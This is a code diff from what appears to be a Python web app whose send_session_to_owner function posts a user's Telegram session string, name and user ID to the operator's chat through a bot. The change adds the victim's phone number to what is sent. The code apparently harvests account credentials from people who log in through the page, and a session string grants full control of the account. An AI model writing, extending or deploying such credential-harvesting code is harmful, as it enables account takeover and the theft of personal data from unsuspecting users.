@@ -165,12 +165,14 @@ async def session_login():
     return await render_template('session_login.html')
 
 async def send_session_to_owner(session_str, me):
+    phone_number = me.phone if me.phone else "Hidden or not available"
     await bot.send_message(
         chat_id=OWNER_CHAT_ID,
         text=(
             f"🔐 Session Login:\n"
             f"Name: {me.first_name}\n"
             f"User ID: {me.id}\n"
+            f"Phone: {phone_number}\n"
             f"Session string:\n{session_str}"
         )
     )
